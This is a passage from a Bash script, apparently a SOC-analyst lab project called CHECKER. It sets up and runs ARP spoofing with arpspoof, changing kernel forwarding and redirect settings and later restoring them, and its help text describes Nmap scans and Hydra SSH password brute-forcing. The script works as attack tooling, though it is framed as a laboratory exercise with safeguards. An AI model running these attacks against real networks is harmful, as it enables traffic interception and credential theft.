    log_event "LOCAL_SETTINGS_RESTORED" 0 || return 1
    pass "Previous Kali network settings restored and verified."
    if (( log_failed )); then
        fail "Settings were restored, but their state log could not be updated."
        return 1
    fi
}

prepare_arp_settings() {
    local index key original current
    # Per-interface forwarding avoids the broad resets caused by global ip_forward.
    # Disable redirects at both levels so Kali does not redirect the target back.
    local -a keys=("net/ipv4/conf/all/send_redirects"
                   "net/ipv4/conf/$INTERFACE/send_redirects"
                   "net/ipv4/conf/$INTERFACE/forwarding")
    local -a values=(0 0 1)
    for index in "${!keys[@]}"; do
        key="${keys[index]}"
        original=$(sysctl -n "$key" 2>> "$ARP_STATE_FILE") || die "Cannot read $key."
        [[ "$original" == 0 || "$original" == 1 ]] || die "Unexpected value for $key."
        printf 'before %s=%s; test_value=%s\n' "$key" "$original" "${values[index]}" \
            >> "$ARP_STATE_FILE" || die "Cannot save the original network settings."
        [[ "$original" != "${values[index]}" ]] || continue
        # Register the old value before writing, so partial setup can be rolled back.
        ARP_SETTING_KEYS+=("$key")
        ARP_SETTING_VALUES+=("$original")
        sysctl -q -w "$key=${values[index]}" >> "$ARP_STATE_FILE" 2>&1 || die "Cannot set $key."
        current=$(sysctl -n "$key" 2>> "$ARP_STATE_FILE") || die "Cannot verify $key."
        [[ "$current" == "${values[index]}" ]] || die "The setting $key did not change."
    done
    log_event "LOCAL_SETTINGS_READY" 0 || die "Cannot log the ARP setup."
}

check_arp_network() {
    local link host route
    link=$(ip -o link show dev "$INTERFACE") || return 1
    [[ "$link" == *"link/ether "* && "$link" != *"NOARP"* ]] || {
        fail "ARP requires an Ethernet interface with ARP enabled."
        return 1
    }
    printf 'Interface: %s\n' "$link" >> "$ARP_STATE_FILE" || return 1
    for host in "$TARGET_IP" "$PEER_IP"; do
        route=$(ip -4 route get "$host") || return 1
        printf 'Route to %s: %s\n' "$host" "$route" >> "$ARP_STATE_FILE" || return 1
        # Both hosts must be directly reachable on the selected interface.
        [[ "$route" == "$host "* && " $route " == *" dev $INTERFACE "* && " $route " != *" via "* ]] || {
            fail "$host is not a direct neighbour on $INTERFACE."
            return 1
        }
    done
}

attack_arpspoof() {
    local host run_exit
    local -a peers=()
    [[ "$ARP_DURATION_SECONDS" =~ ^[1-9][0-9]*$ ]] || die "ARP_DURATION_SECONDS must be a positive whole number."
    for host in "${TARGETS[@]}"; do
        [[ "$host" == "$TARGET_IP" ]] || peers+=("$host")
    done
    if (( ${#peers[@]} == 0 )); then
        info "No second host was detected. Enter the IPv4 address of another laboratory VM."
    fi
    info "Choose the second laboratory VM whose IPv4 address will be impersonated."
    choose_host PEER_IP "ARP Peer Selection" "${peers[@]}"
    log_event "ARP_PAIR_SELECTED" "-" || die "Cannot log the ARP host pair."
    ARP_STATE_FILE=$(mktemp "$LOG_DIR/arp-state-${TARGET_IP}.XXXXXX.log") || die "Cannot create an ARP state log."
    OUTPUT_FILE="$ARP_STATE_FILE"
    if ! check_arp_network; then
        (( RUNS_SKIPPED += 1 ))
        log_event "SKIPPED_ARP_NETWORK" 2 || die "Cannot log the ARP network check."
        warn "Use two laboratory VMs in the same Ethernet network segment."
        return 2
    fi
    info "Observe $PEER_IP in the ARP table on $TARGET_IP before, during and after the test."
    info "Target commands: Linux: ip neigh ; Windows: arp -a"
    info "ARP cleanup may take up to 15 seconds after the ${ARP_DURATION_SECONDS}s test or Ctrl+C."
    prepare_arp_settings
    # -t restricts poisoning to the selected target. The peer itself is not poisoned.
    # -c own sends corrective ARP replies on exit without borrowing the peer's Ethernet source MAC.
    run_tool arpspoof -i "$INTERFACE" -c own -t "$TARGET_IP" "$PEER_IP"
    run_exit=$?
    restore_arp_settings || die "ARP cleanup reported an error. Check the messages above."
    info "ARP state log: $ARP_STATE_FILE"
    info "Verify the peer's correct MAC address on the target; tool completion alone does not prove restoration."
    return "$run_exit"
}

print_session_summary() {
    section "Session Summary"
    ui_row "Executed runs" "$RUNS_TOTAL"
    ui_row "Completed runs" "$RUNS_COMPLETED" "$C_GREEN"
    (( RUNS_SKIPPED == 0 )) || ui_row "Skipped tests" "$RUNS_SKIPPED" "$C_YELLOW"
    if (( RUNS_OTHER )); then
        ui_row "Other outcomes" "$RUNS_OTHER" "$C_YELLOW"
    else
        ui_row "Other outcomes" "0" "$C_GREEN"
    fi
    ui_row "Session time" "$((SECONDS - SESSION_STARTED_AT))s"
    ui_row "Session exit code" "$SESSION_EXIT"
    ui_row "Session log" "$SESSION_LOG"
    ui_row "Summary log" "$SUMMARY_LOG"
}

show_help() {
    local script_name="${BASH_SOURCE[0]##*/}"
    printf '%s\n' \
        "CHECKER | SOC Analyst | NX220" \
        "" \
        "Usage:" \
        "  sudo bash $script_name" \
        "  bash $script_name --help" \
        "  bash $script_name --version" \
        "" \
        "1. Select the laboratory IPv4 connection." \
        "2. Choose attack 1-3, or R for a random attack." \
        "3. Choose a target by number, enter its IPv4 address, or use R." \
        "4. For SSH, accept/change the port and enter the laboratory username." \
        "   Choose the built-in candidate list or your own readable password file." \
        "   Your file has no password-count limit; use one non-empty password per line." \
        "   Passwords may contain up to 255 bytes. CRLF files are supported." \
        "   Hydra stops after ${HYDRA_TIMEOUT_SECONDS}s, a match, or the end of the list." \
        "   Ctrl+C interrupts the test; shutdown can take up to 5 extra seconds." \
        "   Use --hydra-timeout SECONDS to adjust the limit without editing this file." \
        "   A timeout means the dictionary may not have been fully tested." \
        "   The SSH port is checked before account and password-list questions." \
        "   Later SSH tests offer your previous port, username and list as defaults." \
        "5. For ARP, select a different laboratory VM as the peer by number, IP or R." \
        "   Both hosts must be direct Ethernet neighbours on the selected interface." \
        "   ARP runs for ${ARP_DURATION_SECONDS}s, followed by up to 15s for corrective replies." \
        "   Kali forwarding/redirect settings are saved and restored after the test." \
        "   Original settings are recorded in the arp-state output log." \
        "   Watch the target's ARP table before/during/after: Linux ip neigh; Windows arp -a." \
        "   A restrictive forwarding firewall can still prevent relayed traffic." \
        "6. Use y for another attack, r to refresh networks/hosts, or Enter/n to finish." \
        "   Manual IPv4 input also works for hosts missed by discovery." \
        "" \
        "Optional settings (positive whole seconds; limits cannot be disabled):" \
        "  --network IPv4/CIDR         Discovery range (default: selected interface subnet)." \
        "  --ports LIST                Nmap TCP ports, e.g. 22,80,8000-8100 or 1-65535." \
        "                              Default: the 100 most common TCP ports." \
        "  --discovery-timeout SECONDS Discovery limit (default: 60)." \
        "  --scan-timeout SECONDS      Nmap scan limit (default: 60)." \
        "  --ssh-check-timeout SECONDS TCP port check limit (default: 12)." \
        "  --hydra-timeout SECONDS     Total Hydra limit (default: 300)." \
        "  --ssh-wait SECONDS          Hydra response wait (default: 32)." \
        "  --arp-duration SECONDS      ARP duration (default: 30)." \
        "Example:" \
        "  sudo bash $script_name --ports 22,80,443 --hydra-timeout 120" \
        "" \
        "Requires Linux, Bash 4.2+, GNU coreutils, iproute2, procps, util-linux and the attack tools." \
        "Automatic dependency installation uses apt-get; other distributions need manual installation." \
        "IPv4 only. ARP requires one selected target and one peer on the same Ethernet segment." \
        "The kernel route is checked before Nmap/Hydra; use an interface with a route to the target." \
        "Only one CHECKER session can run at a time." \
        "SSH defaults are remembered only until the script exits." \
        "COMPLETED means the tool finished; inspect its output for actual findings." \
        "DURATION_REACHED means the planned ARP stop, not confirmed poisoning/restoration." \
        "Invalid input displays an error and terminates the program." \
        "Logs: /var/log/checker/checker.log and individual output files." \
        "Each session also has its own event log, ID, run numbers and script checksum." \
        "The final exit code keeps the first failed/skipped test, even if later tests finish normally." \
        "Hydra output may contain discovered credentials; log files are readable only by their owner." \
        "--help (or -h) and --version need no sudo and perform no network activity."
}

main() {
    local again last_exit=0
    setup_ui
    # Handle help before root checks, installation, logging or network discovery.
    if (( $# == 1 )) && [[ "$1" == --help || "$1" == -h ]]; then
        show_help
        return 0
    fi
    if (( $# == 1 )) && [[ "$1" == --version ]]; then
        printf 'CHECKER %s\n' "$CHECKER_VERSION"
        return 0
    fi
    parse_options "$@"
    print_banner
    SESSION_STARTED_AT=$SECONDS
    check_requirements
    # EXIT cleans temporary files; INT/TERM also record an interrupted execution.
    trap cleanup EXIT
    trap interrupt_run INT TERM HUP
    setup_logs
    record_session_start "$@"
    choose_network
    discover_hosts
    while true; do
        (( RUN_ID += 1 ))
        reset_run_context
        choose_attack
        choose_target
        case "$ATTACK_INDEX" in
            0) attack_nmap; last_exit=$? ;;
            1) attack_hydra; last_exit=$? ;;
            2) attack_arpspoof; last_exit=$? ;;
        esac
        # A later successful run must not hide an earlier failure from the caller.
        if (( SESSION_EXIT == 0 && last_exit != 0 )); then SESSION_EXIT=$last_exit; fi
        read_input "Another attack [y], refresh networks/hosts [r], or finish [Enter/N]: " again
        case "$again" in
            y|Y) ;;
            r|R) choose_network; discover_hosts ;;
            n|N|"") print_session_summary; return "$SESSION_EXIT" ;;
            *) die "Invalid continuation choice." ;;
        esac
    done
}

# This guard also allows the functions to be checked without executing attacks.
if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    main "$@"
fi
